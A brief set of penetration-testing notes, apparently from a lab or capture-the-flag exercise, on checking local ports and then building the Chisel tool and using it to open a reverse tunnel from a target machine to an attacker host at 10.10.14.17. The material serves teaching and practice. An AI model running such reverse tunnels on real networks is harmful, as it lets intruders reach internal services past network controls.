___

```bash
netstat -nat
```

To take an initial look,
```bash
curl localhost:8000
```


# Chisel 

```bash
git clone https://github.com/jpillora/chisel
cd chisel
go build -ldflags "-s -w" .
upx chisel
```

[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

[video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)


# Attacker

```bash
sudo ./chisel server --reverse -p 8000
```

# Connect the chisel client to our Attack Host

```bash
./chisel client -v 10.10.14.17:8000 R:8000:127.0.0.1:8000
```
